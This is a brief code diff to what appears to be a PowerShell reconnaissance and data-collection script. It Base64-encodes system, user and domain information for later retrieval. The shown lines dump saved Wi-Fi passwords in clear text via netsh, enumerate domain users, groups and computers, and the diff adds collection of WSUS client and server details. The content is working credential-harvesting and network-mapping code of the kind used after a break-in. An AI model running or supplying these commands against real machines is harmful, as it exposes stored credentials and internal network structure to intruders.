@@ -44,7 +44,9 @@ tracert = Encode64(tracert 8.8.8.8);
 variables = Encode64(Get-ChildItem variable: | out-string);
 wifi_profiles = Encode64(netsh wlan show profiles | out-string);
 wifi_pwd = Encode64((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | out-string);
-whoami = Encode64(whoami /all);
+whoami = Encode64(whoami /all | out-string);
+wsus_clients = Encode64(Get-WsusComputer -All | out-string);
+wsus_server = Encode64(Get-WsusServer | out-string);
 DOMAIN_net_user = Encode64(net user /domain);
 DOMAIN_net_group = Encode64(net group);
 DOMAIN_net_group_computers = Encode64(net group "Domain Computers" /domain)
